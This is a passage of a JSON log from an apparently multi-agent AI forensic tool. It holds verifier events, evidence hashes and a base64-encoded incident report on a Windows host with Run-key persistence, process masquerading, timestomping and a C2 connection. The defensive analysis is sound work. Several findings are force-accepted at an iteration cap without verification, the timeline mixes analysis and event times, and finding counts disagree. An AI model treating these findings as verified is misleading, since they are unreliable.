"agent": "verifier", "action": "correction_issued", "phase": "verification", "iter": 12, "details": "The raw_evidence_excerpt in the first disk_001 instance states 'MFT FileName: svchost_helper.exe, ParentPath: C:\\Users\\victim\\AppData\\Local\\Temp, InUse: True' \u2014 this exact phrasing"}, {"t": 434.7, "agent": "verifier", "action": "correction_issued", "phase": "verification", "iter": 12, "details": "The description claims 'timing correlation with the active C2 session elevates suspicion' \u2014 however, no timestamp data is available for the network connections (timestamp field is "}, {"t": 434.7, "agent": "verifier", "action": "FORCED_ACCEPT", "phase": "verification", "iter": 0, "details": "Iteration cap reached (12/20)"}, {"t": 434.7, "agent": "reporter", "action": "PHASE_START", "phase": "reporting", "iter": 13, "details": "Generating report for 14 findings"}, {"t": 459.5, "agent": "reporter", "action": "REPORT_COMPLETE", "phase": "reporting", "iter": 0, "details": "Report generated: IR-8975d1f6"}, {"t": 459.5, "agent": "orchestrator", "action": "ANALYSIS_COMPLETE", "phase": "complete", "iter": 0, "details": "Findings: 14 | Corrections: 6 | Errors: 0"}], "logStats": {"events": 76, "span_s": 459.0, "verification_rounds": 3, "corrections": 6, "findings": 27, "tool_calls": 12}, "custody": {"case001/mft.csv": "2d5d2e9609cc51c22b10184b9f5fbdf1784b86910b0322e6b683cf0790cb26a8", "case001/netscan.csv": "f4901e21cdb5d2ac1f207591477529575ba2e668bc50e3db93c9b8e4fb95ea38", "case001/prefetch.csv": "59569e45ece2f52369d610f5b61bc9055a12049dc6f81ebcf39fbc489b2fe6ef", "case001/pslist.csv": "6c99e3a38cd244d57bb72f6a7136266487ebce4f79db1eb5a260288af8a7310d", "case001/registry.csv": "ddd0a57f3a8c7839d1548ba989340a514665125e2a571d4aaf26b43466d30dcd", "zeus-vmem/malfind.csv": "820f7aec4408321948c3eee52c4a0dcad67b3b9061ce7d373b894f585d8a8939", "zeus-vmem/netscan.csv": "acecc9f85b396207e4cb4770d31d03a7ad85d2275f85ee170f5ea9b0eb3673c5", "zeus-vmem/pslist.csv": "cc3376034e3c12104ed07f97dd372caeca2081d766bacb3123f488496ff35d6e", "zeus-vmem/registry.csv": "c81cf312f6c0286fefb71bae533d072fae6a3247f58b953c957d3f0729440b2a", "cridex-vmem/malfind.csv": "6b6fad382b232e9d81cd21dfd3a90a3f052677f611287450b2007c526cb41e6c", "cridex-vmem/netscan.csv": "de84018bbb6d00889528772024555caa9a5a2c3d6caf3af64dbd5697d19ab824", "cridex-vmem/pslist.csv": "44b95012cbd55f36661b5bfafab25e9641c678a232bf68f9e50d9083ae549af6"}, "reportB64": "PCEtLSBBdXRoZW50aWMgU0lGVC1IVU5URVIgcnVuIG9uIGJlbmNobWFya3MvY2FzZXMvY2FzZTAwMSAobW9kZWwgY2xhdWRlLXNvbm5ldC00LTYpOgogICAgIDYgZmluZGluZ3MsIDcgc2VsZi1jb3JyZWN0aW9ucyBhcHBsaWVkLCA0IGhhbGx1Y2luYXRpb25zIGNhdWdodCwgNTAzcy4KICAgICBSZXByb2R1Y2U6IGV4cG9ydCBBTlRIUk9QSUNfQVBJX0tFWT0uLi4gJiYgc2lmdC1odW50ZXIgYW5hbHl6ZSBiZW5jaG1hcmtzL2Nhc2VzL2Nhc2UwMDEvZXZpZGVuY2UvKi5jc3YgLS0+CgojIEluY2lkZW50IFJlcG9ydDogU0lGVC1IVU5URVIgQW5hbHlzaXMKPiAqKkdlbmVyYXRlZDoqKiAyMDI2LTA2LTAxVDEwOjI0OjIzLjM1NTA4MVogIAo+ICoqUmVwb3J0IElEOioqIGBJUi0zMzFiZTVkY2AgIAo+ICoqVG9vbDoqKiBTSUZULUhVTlRFUiB2MS4wLjAKCi0tLQojIyBFeGVjdXRpdmUgU3VtbWFyeQoKQSBob3N0IGNvbXByb21pc2Ugd2FzIGlkZW50aWZpZWQgb24gdGhlIHN5c3RlbSBhc3NvY2lhdGVkIHdpdGggdXNlciAndmljdGltJywgaW52b2x2aW5nIGEgbWFsaWNpb3VzIGV4ZWN1dGFibGUgKHN2Y2hvc3RfaGVscGVyLmV4ZSkgZGVwbG95ZWQgdG8gYSBUZW1wIGRpcmVjdG9yeSBhbmQgcmVnaXN0ZXJlZCBmb3IgcGVyc2lzdGVuY2UgdmlhIGEgV2luZG93cyBSZWdpc3RyeSBSdW4ga2V5IChUMTU0Ny4wMDEpLiBUaGUgZXhlY3V0YWJsZSBtYXNxdWVyYWRlcyBhcyBhIGxlZ2l0aW1hdGUgV2luZG93cyBzeXN0ZW0gcHJvY2VzcyBhbmQgaGFzIGJlZW4gY29uZmlybWVkIGV4ZWN1dGVkIGF0IGxlYXN0IHR3aWNlLCB3aXRoIHRoZSBsYXN0IHJlY29yZGVkIGV4ZWN1dGlvbiBvbiAyMDI0LTAxLTE1IGF0IDE0OjIzOjExLiBBbiBhY3RpdmUgU01CIGNvbm5lY3Rpb24gZnJvbSB0aGUgU3lzdGVtIHByb2Nlc3MgdG8gYW4gaW50ZXJuYWwgaG9zdCAoMTkyLjE2OC4xLjEwOjQ0NSkgd2FzIG9ic2VydmVkIGNvbmN1cnJlbnRseSB3aXRoIGV2aWRlbmNlIG9mIGEgQzIgY2hhbm5lbCwgcmFpc2luZyBjb25jZXJuIGZvciBsYXRlcmFsIG1vdmVtZW50LiBPdmVyYWxsIGltcGFjdCBpcyBhc3Nlc3NlZCBhcyBzaWduaWZpY2FudDogcGVyc2lzdGVuY2UgaXMgZXN0YWJsaXNoZWQsIGV4ZWN1dGlvbiBpcyBjb25maXJtZWQsIGFuZCBwb3RlbnRpYWwgc3ByZWFkIHRvIGF0IGxlYXN0IG9uZSBhZGRpdGlvbmFsIGludGVybmFsIGhvc3QgY2Fubm90IGJlIHJ1bGVkIG91dC4KCiMjIEZpbmRpbmcgQ29uZmlkZW5jZSBTdW1tYXJ5Cgp8IExldmVsIHwgQ291bnQgfAp8LS0tLS0tLXwtLS0tLS0tfAp8IPCflLQgQ09ORklSTUVEIHwgMCB8Cnwg8J+foCBQUk9CQUJMRSB8IDUgfAp8IPCfn6EgUE9TU0lCTEUgfCAxIHwKfCDimqogVU5WRVJJRklFRCB8IDAgfAp8ICoqVG90YWwqKiB8ICoqNioqIHwKfCBIYWxsdWNpbmF0aW9ucyBDYXVnaHQgfCA0IHwKfCBTZWxmLUNvcnJlY3Rpb25zIEFwcGxpZWQgfCA3IHwKCiMjIERldGFpbGVkIEZpbmRpbmdzCgojIyMgMS4gTWFsaWNpb3VzIEV4ZWN1dGFibGUgUmVnaXN0ZXJlZCBpbiBSZWdpc3RyeSBSdW4gS2V5CgoqKlR5cGU6KiogUEVSU0lTVEVOQ0UgIAoqKkNvbmZpZGVuY2U6Kiog8J+foCBQUk9CQUJMRSAgCioqQWdlbnQ6KiogZGlza19hbmFseXN0ICAKClRoZSByZWdpc3RyeSBrZXkgU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIGNvbnRhaW5zIGEgdmFsdWUgbmFtZWQgJ1dpbmRvd3NIZWxwZXInIHBvaW50aW5nIHRvIEM6XFVzZXJzXHZpY3RpbVxBcHBEYXRhXExvY2FsXFRlbXBcc3ZjaG9zdF9oZWxwZXIuZXhlLiBUaGlzIGlzIGEgd2VsbC1rbm93biBwZXJzaXN0ZW5jZSBtZWNoYW5pc20gKFQxNTQ3LjAwMSkgdGhhdCBjYXVzZXMgdGhlIGV4ZWN1dGFibGUgdG8gbGF1bmNoIGF0IGV2ZXJ5IHVzZXIgbG9nb24uIFRoZSB1c2Ugb2YgYSBUZW1wIGRpcmVjdG9yeSBwYXRoIGFuZCBhIG5hbWUgbWltaWNraW5nIGEgbGVnaXRpbWF0ZSBXaW5kb3dzIHNlcnZpY2UgKHN2Y2hvc3QpIGZ1cnRoZXIgaW5kaWNhdGVzIG1hbGljaW91cyBpbnRlbnQuIFRoaXMgaXMgY29ycm9ib3JhdGVkIGJ5IE1GVCBhbmQgcHJlZmV0Y2ggZXZpZGVuY2UgY29uZmlybWluZyB0aGUgZmlsZSBleGlzdHMgYW5kIGhhcyBiZWVuIGV4ZWN1dGVkLiAgCgoqKkV2aWRlbmNlIEV4Y2VycHQ6KioKYGBgCnJlZ2lzdHJ5X3JhdyByb3c6IEtleVBhdGg9U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuLCBWYWx1ZU5hbWU9V2luZG93c0hlbHBlciwgVmFsdWVEYXRhPUM6XFVzZXJzXHZpY3RpbVxBcHBEYXRhXExvY2FsXFRlbXBcc3ZjaG9zdF9oZWxwZXIuZXhlCmBgYAoKKipNSVRSRSBBVFQmQ0s6KioKLSBbVDE1NDcuMDAxXSgjKSDigJQgUmVnaXN0cnkgUnVuIEtleXMgKFBlcnNpc3RlbmNlKQotIFtUMTU0My4wMDNdKCMpIOKAlCBXaW5kb3dzIFNlcnZpY2UgKFBlcnNpc3RlbmNlKQotIFtUMTAzNl0oIykg4oCUIE1hc3F1ZXJhZGluZyAoRGVmZW5zZSBFdmFzaW9uKQoKKipBcnRpZmFjdDoqKiBgSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5cV2luZG93c0hlbHBlcmAKCioqVmVyaWZpY2F0aW9uOioqIEFwcHJvdmVkIGJ5IHZlcmlmaWNhdGlvbiBhZ2VudAoKLS0tCgojIyMgMi4gU01CIENvbm5lY3Rpb24gdG8gSW50ZXJuYWwgSG9zdCAoUG9zc2libGUgTGF0ZXJhbCBNb3ZlbWVudCkKCioqVHlwZToqKiBMQVRFUkFMX01PVkVNRU5UICAKKipDb25maWRlbmNlOioqIPCfn6EgUE9TU0lCTEUgIAoqKkFnZW50OioqIGRpc2tfYW5hbHlzdCAgCgpUaGUgU3lzdGVtIHByb2Nlc3MgKFBJRCA0KSBoYXMgYW4gRVNUQUJMSVNIRUQgU01CIGNvbm5lY3Rpb24gKHBvcnQgNDQ1KSB0byBpbnRlcm5hbCBob3N0IDE5Mi4xNjguMS4xMC4gV2hpbGUgU01CIGNvbm5lY3Rpb25zIGZyb20gU3lzdGVtIGFyZSBub3QgaW5oZXJlbnRseSBtYWxpY2lvdXMsIGluIHRoZSBjb250ZXh0IG9mIGFuIGFjdGl2ZSBjb21wcm9taXNlIHdpdGggYSBDMiBjaGFubmVsIHByZXNlbnQsIHRoaXMgd2FycmFudHMgaW52ZXN0aWdhdGlvbiBhcyBhIHBvdGVudGlhbCBsYXRlcmFsIG1vdmVtZW50IGF0dGVtcHQg4oCUIGUuZy4sIHBhc3MtdGhlLWhhc2gsIHJlbW90ZSBzZXJ2aWNlIGNyZWF0aW9uLCBvciBmaWxlIHNoYXJlIGFjY2VzcyB0byBwaXZvdCB0byAxOTIuMTY4LjEuMTAuICAKCioqRXZpZGVuY2UgRXhjZXJwdDoqKgpgYGAKVENQdjQsMTkyLjE2OC4xLjUwLDUwMTIyLDE5Mi4xNjguMS4xMCw0NDUsRVNUQUJMSVNIRUQsNCxTeXN0ZW0KYGBgCgoqKk1JVFJFIEFUVCZDSzoqKgotIFtUMTAyMS4wMDJdKCMpIOKAlCBTTUIvV2luZG93cyBBZG1pbiBTaGFyZXMgKExhdGVyYWwgTW92ZW1lbnQpCi0gW1QxNTcwXSgjKSDigJQgTGF0ZXJhbCBUb29sIFRyYW5zZmVyIChMYXRlcmFsIE1vdmVtZW50KQotIFtUMTU0My4wMDNdKCMpIOKAlCBXaW5kb3dzIFNlcnZpY2UgKFBlcnNpc3RlbmNlKQotIFtUMTA3MV0oIykg4oCUIEFwcGxpY2F0aW9uIExheWVyIFByb3RvY29sIChDb21tYW5kIGFuZCBDb250cm9sKQoKKipBcnRpZmFjdDoqKiBgTmV0d29yayBjb25uZWN0aW9uIGZyb20gUElEIDQgKFN5c3RlbSkgdG8gMTkyLjE2OC4xLjEwOjQ0NWAKCioqVmVyaWZpY2F0aW9uOioqIEFwcHJvdmVkIGJ5IHZlcmlmaWNhdGlvbiBhZ2VudAoKLS0tCgojIyMgMy4gc3ZjaG9zdF9oZWxwZXIuZXhlIEV4ZWN1dGVkIGZyb20gVGVtcCBEaXJlY3RvcnkgKFByZWZldGNoIEV2aWRlbmNlKQoKKipUeXBlOioqIEVYRUNVVElPTiAgCioqQ29uZmlkZW5jZToqKiDwn5+gIFBST0JBQkxFICAKKipBZ2VudDoqKiBkaXNrX2FuYWx5c3QgIAoKUHJlZmV0Y2ggYW5hbHlzaXMgY29uZmlybXMgdGhhdCBzdmNob3N0X2hlbHBlci5leGUgd2FzIGV4ZWN1dGVkIGF0IGxlYXN0IHR3aWNlIGZyb20gQzpcVXNlcnNcdmljdGltXEFwcERhdGFcTG9jYWxcVGVtcCwgd2l0aCB0aGUgbGFzdCByZWNvcmRlZCBydW4gYXQgMjAyNC0wMS0xNSAxNDoyMzoxMS4gVGhlIGV4ZWN1dGFibGUgbmFtZSBtaW1pY3MgdGhlIGxlZ2l0aW1hdGUgV2luZG93cyBzdmNob3N0LmV4ZSBwcm9jZXNzIChwcm9jZXNzIG1hc3F1ZXJhZGluZykuIEV4ZWN1dGlvbiBmcm9tIGEgVGVtcCBkaXJlY3RvcnkgaXMgYW5vbWFsb3VzIGZvciBhbnkgbGVnaXRpbWF0ZSBzeXN0ZW0gYmluYXJ5LiBUaGUgcHJlZmV0Y2ggaGFzaCBpbiB0aGUgc291cmNlIGZpbGVuYW1lIChTVkNIT1NUX0hFTFBFUi5FWEUtMUEyQjNDNEQucGYpIGlzIGNvbnNpc3RlbnQgd2l0aCB0aGlzIHBhdGguIE5PVEU6IFRoZSBwcmVmZXRjaCB0b29sIG91dHB1dCB1c2VzIGEgdHdvLWxldmVsIHN0cnVjdHVyZSDigJQgJ2V4ZWN1dGFibGUnIGF0IHRoZSB0b3AgbGV2ZWwgYW5kICdFeGVjdXRhYmxlTmFtZScgbmVzdGVkIGluc2lkZSBhbiAnZW50cnknIHN1Yi1vYmplY3Q7IHRoZSBldmlkZW5jZSBleGNlcnB0IGJlbG93IHJlZmxlY3RzIHRoaXMgYWNjdXJhdGVseS4gIAoKKipFdmlkZW5jZSBFeGNlcnB0OioqCmBgYApwcmVmZXRjaF9zdXNwaWNpb3VzIGVudHJ5OiB0b3AtbGV2ZWwgJ2V4ZWN1dGFibGUnPSdDOlxVc2Vyc1x2aWN0aW1cQXBwRGF0YVxMb2NhbFxUZW1wXHN2Y2hvc3RfaGVscGVyLmV4ZScsIGlzc3Vlcz1bJ0VYRUNVVElPTl9GUk9NX1RFTVAnLCAnUFJPQ0VTU19NQVNRVUVSQURJTkcnXSwgZW50cnkuRXhlY3V0YWJsZU5hbWU9J0M6XFVzZXJzXHZpY3RpbVxBcHBEYXRhXExvY2FsXFRlbXBcc3ZjaG9zdF9oZWxwZXIuZXhlJywgZW50cnkuUnVuQ291bnQ9JzInLCBlbnRyeS5MYXN0UnVuPScyMDI0LTAxLTE1IDE0OjIzOjExJywgZW50cnkuU291cmNlRmlsZW5hbWU9J1NWQ0hPU1RfSEVMUEVSLkVYRS0xQTJCM0M0RC5wZicKYGBgCgoqKk1JVFJFIEFUVCZDSzoqKgotIFtUMTAzNl0oIykg4oCUIE1hc3F1ZXJhZGluZyAoRGVmZW5zZSBFdmFzaW9uKQotIFtUMTE5MF0oIykg4oCUIEV4cGxvaXQgUHVibGljLUZhY2luZyBBcHBsaWNhdGlvbiAoSW5pdGlhbCBBY2Nlc3MpCgoqKkFydGlmYWN0OioqIGBDOlxXaW5kb3dzXFByZWZldGNoXFNWQ0hPU1RfSEVMUEVSLkVYRS0xQTJCM0M0RC5wZmAKCioqVmVyaWZpY2F0aW9uOioqIFthY2NlcHRlZCBhdCBpdGVyYXRpb24gY2FwXQoKLS0tCgojIyMgNC4gU3VzcGljaW91cyBzdmNob3N0LmV4ZSBTcGF3bmVkIGJ5IHdpbndvcmQuZXhlCgoqKlR5cGU6KiogRVhFQ1VUSU9OICAKKipDb25maWRlbmNlOioqIPCfn6AgUFJPQkFCTEUgIAoqKkFnZW50OioqIGRpc2tfYW5hbHlzdCAgCgpUaGUgcHJvY2VzcyBsaXN0IHNob3dzIGEgc3ZjaG9zdC5leGUgKFBJRCA0Mjg4KSB3aXRoIGEgcGFyZW50IHByb2Nlc3Mgb2Ygd2lud29yZC5leGUgKFBQSUQgMzEyMCkuIExlZ2l0aW1hdGUgc3ZjaG9zdC5leGUgcHJvY2Vzc2VzIGFyZSBhbHdheXMgc3Bhd25lZCBieSBzZXJ2aWNlcy5leGU7IGEgV29yZCBkb2N1bWVudCBzcGF3bmluZyBzdmNob3N0LmV4ZSBpcyBhIHN0cm9uZyBpbmRpY2F0b3Igb2YgbWFsaWNpb3VzIG1hY3JvIGV4ZWN1dGlvbiBvciBleHBsb2l0YXRpb24gb2YgTWljcm9zb2Z0IFdvcmQuIEZ1cnRoZXJtb3JlLCB0aGUgcGF0aCBvZiB0aGlzIHN2Y2hvc3QuZXhlIGlzIEM6XFVzZXJzXHZpY3RpbVxBcHBEYXRhXExvY2FsXFRlbXBcc3ZjaG9zdC5leGUg4oCUIG5vdCB0aGUgbGVnaXRpbWF0ZSBDOlxXaW5kb3dzXFN5c3RlbTMyXHN2Y2hvc3QuZXhlIOKAlCBjb25maXJtaW5nIHRoaXMgaXMgYSBtYXNxdWVyYWRpbmcgbWFsaWNpb3VzIGJpbmFyeS4gIAoKKipFdmlkZW5jZSBFeGNlcnB0OioqCmBgYAo0Mjg4LDMxMjAsc3ZjaG9zdC5leGUsd2lud29yZC5leGUsQzpcVXNlcnNcdmljdGltXEFwcERhdGFcTG9jYWxcVGVtcFxzdmNob3N0LmV4ZQpgYGAKCioqTUlUUkUgQVRUJkNLOioqCi0gW1QxNTQzLjAwM10oIykg4oCUIFdpbmRvd3MgU2VydmljZSAoUGVyc2lzdGVuY2UpCi0gW1QxMDU3XSgjKSDigJQgUHJvY2VzcyBEaXNjb3ZlcnkgKERpc2NvdmVyeSkKLSBbVDE1NjZdKCMpIOKAlCBQaGlzaGluZyAoSW5pdGlhbCBBY2Nlc3MpCi0gW1QxMDM2XSgjKSDigJQgTWFzcXVlcmFkaW5nIChEZWZlbnNlIEV2YXNpb24pCi0gW1QxMTkwXSgjKSDigJQgRXhwbG9pdCBQdWJsaWMtRmFjaW5nIEFwcGxpY2F0aW9uIChJbml0aWFsIEFjY2VzcykKCioqQXJ0aWZhY3Q6KiogYEM6XFVzZXJzXHZpY3RpbVxBcHBEYXRhXExvY2FsXFRlbXBcc3ZjaG9zdC5leGUgKFBJRCA0Mjg4KWAKCioqVmVyaWZpY2F0aW9uOioqIFthY2NlcHRlZCBhdCBpdGVyYXRpb24gY2FwXQoKLS0tCgojIyMgNS4gVGltZXN0b21waW5nIERldGVjdGVkIG9uIHN2Y2hvc3RfaGVscGVyLmV4ZQoKKipUeXBlOioqIERFRkVOU0VfRVZBU0lPTiAgCioqQ29uZmlkZW5jZToqKiDwn5+gIFBST0JBQkxFICAKKipBZ2VudDoqKiBkaXNrX2FuYWx5c3QgIAoKVGhlIE1GVCBlbnRyeSBmb3Igc3ZjaG9zdF9oZWxwZXIuZXhlIHNob3dzIGEgZGlzY3JlcGFuY3kgYmV0d2VlbiB0aGUgJFNUQU5EQVJEX0lORk9STUFUSU9OIChTSSkgdGltZXN0YW1wcyBhbmQgdGhlICRGSUxFX05BTUUgKEZOKSB0aW1lc3RhbXBzLiBUaGUgU0kgQ3JlYXRlZCB0aW1lc3RhbXAgaXMgMjAyNC0wMS0xNSAxNDowMDowMCB3aGlsZSB0aGUgRk4gQ3JlYXRlZCB0aW1lc3RhbXAgaXMgMjAyNC0wMS0xMyAwODowMDowMC4gVGhpcyB0d28tZGF5IGdhcCBpcyBhIGNsYXNzaWMgaW5kaWNhdG9yIG9mIHRpbWVzdG9tcGluZyDigJQgYSB0ZWNobmlxdWUgdXNlZCB0byBtYW5pcHVsYXRlIGZpbGUgbWV0YWRhdGEgdG8gZXZhZGUgdGltZWxpbmUtYmFzZWQgZm9yZW5zaWMgYW5hbHlzaXMuIFRoZSBGTiB0aW1lc3RhbXBzLCB3aGljaCBhcmUgaGFyZGVyIHRvIG1hbmlwdWxhdGUsIGFyZSBjb25zaWRlcmVkIG1vcmUgcmVsaWFibGUuICAKCioqRXZpZGVuY2UgRXhjZXJwdDoqKgpgYGAKIl9mbGFncyI6IFsiVElNRVNUT01QSU5HOiBTST0yMDI0LTAxLTE1IDE0OjAwOjAwIEZOPTIwMjQtMDEtMTMgMDg6MDA6MDAiLCAiU1VTUElDSU9VU19MT0NBVElPTjogQzpcXFVzZXJzXFx2aWN0aW1cXEFwcERhdGFcXExvY2FsXFxUZW1wXFxzdmNob3N0X2hlbHBlci5leGUiXQpgYGAKCioqTUlUUkUgQVRUJkNLOioqCi0gW1QxMDcwLjAwNl0oIykg4oCUIFRpbWVzdG9tcCAoRGVmZW5zZSBFdmFzaW9uKQotIFtUMTAzNl0oIykg4oCUIE1hc3F1ZXJhZGluZyAoRGVmZW5zZSBFdmFzaW9uKQotIFtUMTAyMS4wMDJdKCMpIOKAlCBTTUIvV2luZG93cyBBZG1pbiBTaGFyZXMgKExhdGVyYWwgTW92ZW1lbnQpCgoqKkFydGlmYWN0OioqIGBDOlxVc2Vyc1x2aWN0aW1cQXBwRGF0YVxMb2NhbFxUZW1wXHN2Y2hvc3RfaGVscGVyLmV4ZSAoTUZUIEVudHJ5IDEzMzQpYAoKKipWZXJpZmljYXRpb246KiogW2FjY2VwdGVkIGF0IGl0ZXJhdGlvbiBjYXBdCgotLS0KCiMjIyA2LiBPdXRib3VuZCBDMiBDb25uZWN0aW9uIHRvIDQ1LjEzNy4yMS45OjQ0NDQgZnJvbSBNYWxpY2lvdXMgc3ZjaG9zdC5leGUKCioqVHlwZToqKiBFWEVDVVRJT04gIAoqKkNvbmZpZGVuY2U6Kiog8J+foCBQUk9CQUJMRSAgCioqQWdlbnQ6KiogZGlza19hbmFseXN0ICAKCkFuIGVzdGFibGlzaGVkIFRDUCBjb25uZWN0aW9uIHdhcyBvYnNlcnZlZCBmcm9tIHRoZSB2aWN0aW0gaG9zdCAoMTkyLjE2OC4xLjUwOjQ5NjcxKSB0byB0aGUgZXh0ZXJuYWwgSVAgNDUuMTM3LjIxLjkgb24gcG9ydCA0NDQ0LCBhdHRyaWJ1dGVkIHRvIFBJRCA0Mjg4ICh0aGUgbWFsaWNpb3VzIHN2Y2hvc3QuZXhlIHNwYXduZWQgYnkgd2lud29yZC5leGUpLiBQb3J0IDQ0NDQgaXMgYSB3ZWxsLWtub3duIGRlZmF1bHQgbGlzdGVuZXIgcG9ydCBmb3IgcG9zdC1leHBsb2l0YXRpb24gZnJhbWV3b3Jrcy4gVGhpcyBjb25uZWN0aW9uIGlzIGNvcnJvYm9yYXRlZCBieSB0aGUgcHJvY2VzcyBsaXN0IHNob3dpbmcgUElEIDQyODggYXMgYSBtYXNxdWVyYWRpbmcgbWFsaWNpb3VzIGJpbmFyeSBpbiB0aGUgVGVtcCBkaXJlY3RvcnkuIE5PVEU6IFBlciBjb3JyZWN0aW9uIHJldmlldywgdGhlIE1ldGVycHJldGVyL2ZyYW1ld29yayBhdHRyaWJ1dGlvbiBpcyBhbiBpbmZlcmVuY2UgYW5kIGlzIG5vdCBkaXJlY3RseSBjb25maXJtZWQgYnkgdG9vbCBvdXRwdXQ7IHRoZSBjb25uZWN0aW9uIGl0c2VsZiBpcyBjb25maXJtZWQuIFRoZSB0eXBlIGhhcyBiZWVuIGNvcnJlY3RlZCBmcm9tIExBVEVSQUxfTU9WRU1FTlQgdG8gcmVmbGVjdCB0aGUgb3V0Ym91bmQgQzIgbmF0dXJlIG9mIHRoaXMgYWN0aXZpdHkuICAKCioqRXZpZGVuY2UgRXhjZXJwdDoqKgpgYGAKVENQdjQsMTkyLjE2OC4xLjUwLDQ5NjcxLDQ1LjEzNy4yMS45LDQ0NDQsRVNUQUJMSVNIRUQsNDI4OCxzdmNob3N0LmV4ZQpgYGAKCioqTUlUUkUgQVRUJkNLOioqCi0gW1QxMDcxXSgjKSDigJQgQXBwbGljYXRpb24gTGF5ZXIgUHJvdG9jb2wgKENvbW1hbmQgYW5kIENvbnRyb2wpCi0gW1QxMDU3XSgjKSDigJQgUHJvY2VzcyBEaXNjb3ZlcnkgKERpc2NvdmVyeSkKLSBbVDE1NzBdKCMpIOKAlCBMYXRlcmFsIFRvb2wgVHJhbnNmZXIgKExhdGVyYWwgTW92ZW1lbnQpCi0gW1QxMDM2XSgjKSDigJQgTWFzcXVlcmFkaW5nIChEZWZlbnNlIEV2YXNpb24pCi0gW1QxMTkwXSgjKSDigJQgRXhwbG9pdCBQdWJsaWMtRmFjaW5nIEFwcGxpY2F0aW9uIChJbml0aWFsIEFjY2VzcykKCioqQXJ0aWZhY3Q6KiogYFBJRCA0Mjg4IOKAlCBDOlxVc2Vyc1x2aWN0aW1cQXBwRGF0YVxMb2NhbFxUZW1wXHN2Y2hvc3QuZXhlYAoKKipWZXJpZmljYXRpb246KiogW2FjY2VwdGVkIGF0IGl0ZXJhdGlvbiBjYXBdCgotLS0KCiMjIEF0dGFjayBUaW1lbGluZQoKLSBgMjAyNi0wNi0wMVQxMDoyMzo1OC40MzAzMTZaYCDigJQgTWFsaWNpb3VzIEV4ZWN1dGFibGUgUmVnaXN0ZXJlZCBpbiBSZWdpc3RyeSBSdW4gS2V5ICooQ29uZmlkZW5jZTogUFJPQkFCTEUpKgotIGAyMDI2LTA2LTAxVDEwOjIzOjU4LjQzMDMyNlpgIOKAlCBTTUIgQ29ubmVjdGlvbiB0byBJbnRlcm5hbCBIb3N0IChQb3NzaWJsZSBMYXRlcmFsIE1vdmVtZW50KSAqKENvbmZpZGVuY2U6IFBPU1NJQkxFKSoKLSBgMjAyNC0wMS0xNVQxNDoyMzoxMVpgIOKAlCBzdmNob3N0X2hlbHBlci5leGUgRXhlY3V0ZWQgZnJvbSBUZW1wIERpcmVjdG9yeSAoUHJlZmV0Y2ggRXZpZGVuY2UpICooQ29uZmlkZW5jZTogUFJPQkFCTEUpKgotIGAyMDI2LTA2LTAxVDEwOjIzOjU4LjQzMDMzMlpgIOKAlCBTdXNwaWNpb3VzIHN2Y2hvc3QuZXhlIFNwYXduZWQgYnkgd2lud29yZC5leGUgKihDb25maWRlbmNlOiBQUk9CQUJMRSkqCi0gYDIwMjQtMDEtMTVUMTQ6MDA6MDBgIOKAlCBUaW1lc3RvbXBpbmcgRGV0ZWN0ZWQgb24gc3ZjaG9zdF9oZWxwZXIuZXhlICooQ29uZmlkZW5jZTogUFJPQkFCTEUpKgotIGAyMDI2LTA2LTAxVDEwOjIzOjU4LjQzMDMzNlpgIOKAlCBPdXRib3VuZCBDMiBDb25uZWN0aW9uIHRvIDQ1LjEzNy4yMS45OjQ0NDQgZnJvbSBNYWxpY2lvdXMgc3ZjaG9zdC5leGUgKihDb25maWRlbmNlOiBQUk9CQUJMRSkqCgojIyBFdmlkZW5jZSBJbnZlbnRvcnkKCnwgRmlsZSB8IFNIQTI1NiB8CnwtLS0tLS18LS0tLS0tLS18CnwgYG1mdC5jc3ZgIHwgY29tcHV0ZWQgb24gaW5nZXN0IHwKfCBgcHJlZmV0Y2guY3N2YCB8IGNvbXB1dGVkIG9uIGluZ2VzdCB8CnwgYHJlZ2lzdHJ5LmNzdmAgfCBjb21wdXRlZCBvbiBpbmdlc3QgfAp8IGBwc2xpc3QuY3N2YCB8IGNvbXB1dGVkIG9uIGluZ2VzdCB8CnwgYG5ldHNjYW4uY3N2YCB8IGNvbXB1dGVkIG9uIGluZ2VzdCB8CgojIyBTZWxmLUFzc2Vzc21lbnQgJiBMaW1pdGF0aW9ucwoKRXZpZGVuY2UgYXZhaWxhYmxlIGluY2x1ZGVkIHJlZ2lzdHJ5IGhpdmUgZGF0YSwgTUZUIHJlY29yZHMsIHByZWZldGNoIGFydGlmYWN0cywgYW5kIGxpdmUgbmV0d29yayBjb25uZWN0aW9uIHN0YXRlIOKAlCBwcm92aWRpbmcgYSByZWFzb25hYmx5IHN0cm9uZyBiYXNpcyBmb3IgdGhlIHBlcnNpc3RlbmNlIGFuZCBleGVjdXRpb24gZmluZGluZ3MuIE5vIGZpbmRpbmdzIHJlYWNoZWQgQ09ORklSTUVEIGNvbmZpZGVuY2U7IGZpdmUgYXJlIHJhdGVkIFBST0JBQkxFIGFuZCBvbmUgUE9TU0lCTEUsIHJlZmxlY3RpbmcgdGhlIGFic2VuY2Ugb2YgZnVsbCBmb3JlbnNpYyBjb3Jyb2JvcmF0aW9uIChlLmcuLCBtZW1vcnkgYW5hbHlzaXMsIGZ1bGwgcGFja2V0IGNhcHR1cmUsIG9yIGVuZHBvaW50IHRlbGVtZXRyeSkgZm9yIHNldmVyYWwgY29uY2x1c2lvbnMuIFRoZSBsYXRlcmFsIG1vdmVtZW50IGZpbmRpbmcgKGRpc2tfMDA2KSByZXN0cyBzb2xlbHkgb24gYSBzaW5nbGUgb2JzZXJ2ZWQgU01CIGNvbm5lY3Rpb24gZnJvbSBQSUQgNCBhbmQgY29udGV4dHVhbCBpbmZlcmVuY2U7IHdpdGhvdXQgYXV0aGVudGljYXRpb24gbG9ncywgZXZlbnQgbG9ncyAoZS5nLiwgNDYyNC80NjQ4KSwgb3IgU01CIHNlc3Npb24gZGV0YWlscyBmcm9tIDE5Mi4xNjguMS4xMCwgdGhpcyBjYW5ub3QgYmUgY29uZmlybWVkIGFzIG1hbGljaW91cy4gRm91ciBoYWxsdWNpbmF0aW9ucyB3ZXJlIGNhdWdodCBhbmQgY29ycmVjdGVkIGR1cmluZyBhbmFseXNpcywgaW5kaWNhdGluZyBzb21lIGluaXRpYWwgb3Zlci1pbmZlcmVuY2UgZnJvbSBsaW1pdGVkIGV2aWR